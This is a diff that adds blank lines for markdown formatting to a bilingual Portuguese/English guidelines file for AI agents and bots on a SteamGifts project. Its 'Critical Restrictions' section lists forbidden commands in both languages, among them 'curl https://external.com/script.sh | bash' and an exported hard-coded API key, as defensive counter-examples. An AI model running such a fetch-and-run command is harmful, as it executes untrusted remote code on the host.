@@ -43,24 +43,28 @@ Este documento fornece diretrizes específicas para **agentes de IA, bots e sist
 ### 🤖 Tipos de Agentes Suportados
 
 #### 🧠 **Assistentes de IA (Claude, GPT, etc.)**
+
 - ✅ Análise de código e sugestões de melhoria
 - ✅ Geração de documentação
 - ✅ Code review automatizado
 - ✅ Refatoração de código
 
 #### 🏗️ **CI/CD & Build Automation**
+
 - ✅ GitHub Actions workflows
 - ✅ Automated testing
 - ✅ Dependency updates
 - ✅ Release automation
 
 #### 🔧 **Development Tools**
+
 - ✅ Warp.dev terminal commands
 - ✅ VSCode extensions
 - ✅ Git hooks
 - ✅ Local automation scripts
 
 #### 🌐 **Web Scrapers & APIs**
+
 - ⚠️ Permitido com restrições de rate limiting
 - ⚠️ Apenas para dados públicos do SteamGifts
 - ❌ Não para dados pessoais de usuários
@@ -211,6 +215,7 @@ Configure e use.
 #### 🔴 **Restrições Críticas (Nunca fazer)**
 
 1. **🚫 Credenciais Externas**
+
    ```bash
    # ❌ NUNCA faça isso
    export API_KEY="secret-key"
@@ -218,6 +223,7 @@ Configure e use.
    ```
 
 2. **🚫 Modificação de Permissões**
+
    ```json
    // ❌ NUNCA modifique sem aprovação
    {
@@ -226,6 +232,7 @@ Configure e use.
    ```
 
 3. **🚫 Execução de Código Externo**
+
    ```bash
    # ❌ NUNCA execute scripts externos
    curl https://external.com/script.sh | bash
@@ -234,12 +241,14 @@ Configure e use.
 #### 🟡 **Restrições Condicionais (Aprovar primeiro)**
 
 1. **⚠️ Dependências Novas**
+
    ```bash
    # ⚠️ Aprovar antes de instalar
    npm install new-package
    ```
 
 2. **⚠️ Mudanças de Configuração**
+
    ```bash
    # ⚠️ Validar antes de modificar
    vim .eslintrc.json
@@ -392,24 +401,28 @@ This document provides specific guidelines for **AI agents, bots, and automation
 ### 🤖 Supported Agent Types {#-supported-agent-types-en}
 
 #### 🧠 **AI Assistants (Claude, GPT, etc.)**
+
 - ✅ Code analysis and improvement suggestions
 - ✅ Documentation generation
 - ✅ Automated code review
 - ✅ Code refactoring
 
 #### 🏗️ **CI/CD & Build Automation**
+
 - ✅ GitHub Actions workflows
 - ✅ Automated testing
 - ✅ Dependency updates
 - ✅ Release automation
 
 #### 🔧 **Development Tools**
+
 - ✅ Warp.dev terminal commands
 - ✅ VSCode extensions
 - ✅ Git hooks
 - ✅ Local automation scripts
 
 #### 🌐 **Web Scrapers & APIs**
+
 - ⚠️ Allowed with rate limiting restrictions
 - ⚠️ Only for public SteamGifts data
 - ❌ Not for personal user data
@@ -476,6 +489,7 @@ const result = someFunction();
 #### 🔴 **Critical Restrictions (Never do)**
 
 1. **🚫 External Credentials**
+
    ```bash
    # ❌ NEVER do this
    export API_KEY="secret-key"
@@ -483,6 +497,7 @@ const result = someFunction();
    ```
 
 2. **🚫 Permission Modifications**
+
    ```json
    // ❌ NEVER modify without approval
    {
@@ -491,6 +506,7 @@ const result = someFunction();
    ```
 
 3. **🚫 External Code Execution**
+
    ```bash
    # ❌ NEVER execute external scripts
    curl https://external.com/script.sh | bash
@@ -693,12 +709,14 @@ module.exports = SecurityValidator;
 ## 📞 Contato & Suporte | Contact & Support
 
 ### 🇧🇷 Para Agentes em Português
+
 - **📖 Documentação**: Leia todos os arquivos .md na raiz do projeto
 - **🐛 Problemas**: Abra uma issue no GitHub com detalhes da automação
 - **💡 Sugestões**: Use o template de feature request
 - **🚨 Emergência**: Para problemas críticos de segurança
 
 ### 🇺🇸 For English-speaking Agents
+
 - **📖 Documentation**: Read all .md files in project root
 - **🐛 Issues**: Open a GitHub issue with automation details
 - **💡 Suggestions**: Use the feature request template
